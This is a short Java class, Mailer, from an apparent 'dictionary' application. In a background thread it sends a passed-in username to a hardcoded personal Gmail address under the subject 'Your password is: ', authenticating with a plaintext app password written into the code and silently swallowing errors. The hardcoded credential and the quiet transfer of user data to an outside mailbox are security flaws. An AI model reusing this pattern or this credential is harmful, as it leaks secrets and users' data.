package dictionary;

import java.util.Properties;
import javax.mail.*;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

public class Mailer {
    public static void send(String username){

        new Thread(new Runnable() {
            @Override
            public void run() {
                String from = "dictionarynotice@gmail.com";
                String to = "skodin36@gmail.com";

                String host = "smtp.gmail.com";

                String smtpPort = "465";

                Properties properties = new Properties();

                properties.put("mail.smtp.host", host);
                properties.put("mail.smtp.port", smtpPort);
                properties.put("mail.smtp.ssl.enable", "true");
                properties.put("mail.smtp.auth", "true");

                Session session = Session.getInstance(properties, new Authenticator() {
                    @Override
                    protected PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication(from, "nirsxlpowwcxtfdp");
                    }
                });

                session.setDebug(true);

                try {
                    MimeMessage mimeMessage = new MimeMessage(session);
                    mimeMessage.setFrom(new InternetAddress(from));
                    mimeMessage.addRecipient(Message.RecipientType.TO, new InternetAddress(to));
                    System.out.println("USERNAME IS: " + username);
                    mimeMessage.setSubject("Your password is: ");
                    mimeMessage.setText(username);
                    Transport.send(mimeMessage);
                } catch (Exception e) {
//            System.err.println("Error");
                }
            }
        }).start();

    }
}
